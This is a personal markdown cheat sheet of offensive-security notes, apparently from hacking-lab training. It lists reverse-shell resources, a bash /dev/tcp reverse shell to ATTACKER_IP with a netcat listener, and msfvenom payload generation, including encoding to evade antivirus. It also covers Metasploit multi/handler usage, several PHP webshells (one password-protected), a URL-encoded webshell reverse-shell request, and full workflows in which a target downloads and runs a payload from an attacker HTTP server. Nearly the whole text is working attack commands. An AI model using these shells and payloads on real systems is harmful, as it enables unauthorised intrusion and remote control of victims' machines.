#### my first time using markdown, sorry if it's a mess

# Payload Resources:
#### legendary revshell generator:
[revshells.com](https://www.revshells.com/)

#### shell cheatsheets
[Reverse shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[Bind shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)

#### much more on this repo
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)

---
## example: bash TCP revshell using /dev/tcp

target runs this:
`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`

attacker connects with a classic netcat
`nc -lvnp 4444`

---
# --- msfvenom ---

### syntax
`msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>`

eg. `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.14.15 LPORT=4444`

### naming pattern
`<platform>/<architecture>/<payload>`

## stageless vs staged
stageless = all at once
+ likely to trigger antivirus
+ simple for the attacker (simple nc listener)
---
staged = two phases
+ smaller initial payload
+ harder to detect than stageless
+ requires special listener (eg. multi/handler in metasploit)
---
### finding payloads
`msfvenom --list payloads | grep linux | grep meterpreter`

### encoding & evasion
example command:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe -e x64/xor -i 3 -o encoded_shell.exe`

`-e <encoder>` to encode the payload
`-i <iterations>` to encode multiple times

---
# --- multihandler ---
after generating a msfvenom payload (make sure to note the PAYLOAD, LHOST and LPORT),
we use multi/handler as a listener

```
sudo msfconsole

use multi/handler

options

set PAYLOAD windows/x64/shell_reverse_tcp

set LHOST <attacker_IP>

set LPORT <PORT>

# `exploit -j` runs it in background, so we can still use msf
exploit -j
```

when payload is executed, we will get a session in msfconsole (eg. meterpreter session 1 opened)

```
sessions

# you should see your session here, interact with -i
sessions -i <session_ID>
```

# --- webshells ---

### basic PHP webshell
`<?php echo "" . shell_exec($_GET["cmd"]) . ""; ?>`

### PHP webshell with POST-based execution
`<?php
if ($_POST['cmd']) {
    echo "" . shell_exec($_POST['cmd']) . "";
}
?>`
### password-protected PHP webshell
`<?php
$password = "secure_password_here";
if ($_POST['auth'] === $password && $_POST['cmd']) {
    echo "" . shell_exec($_POST['cmd']) . "";
} else if ($_POST['auth'] && $_POST['auth'] !== $password) {
    echo "Authentication failed";
}
?>`

### windows & linux webshells
you just URL encode your reverse shell and pass it as a parameter

the powershell one was very long, so I didn't include it here

#### linux:
`http://target-server.thm/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27`

for the URL encoding, you can use [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true))

---

## example: stageless reverse shell using msfvenom
```
attacker:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.112.67.36 LPORT=4444 -f elf -o shell.elf

attacker:~$ python3 -m http.server 8000

# open another terminal and start nc listener
attacker:~$ nc -lvnp 4444
```
target downloads and executes the payload
```
target:~$ wget http://10.112.67.36:8000/shell.elf -O
target:~$ chmod +x /tmp/shell.elf && /tmp/shell.elf
```
now on the attacker listener we received a shell
```
attacker:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.112.171.40 47172
<malicious_command_placeholder>
```

## stageless windows EXE
first generate the payload and serve it over HTTP
```
attacker:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.112.67.36 LPORT=4444 -f exe -o shell.exe

attacker:~$ python3 -m http.server 8000
```
in another attacker terminal, start the listener
```
attacker:~$ nc -lvnp 4444
```
target downloads and executes the payload
```
PS C:\Users\Administrator> Invoke-WebRequest http://10.112.67.36:8000/shell.exe -OutFile C:\Users\Administrator\Desktop\shell.exe

PS C:\Users\Administrator> C:\Users\Administrator\Desktop\shell.exe
```
that's it.

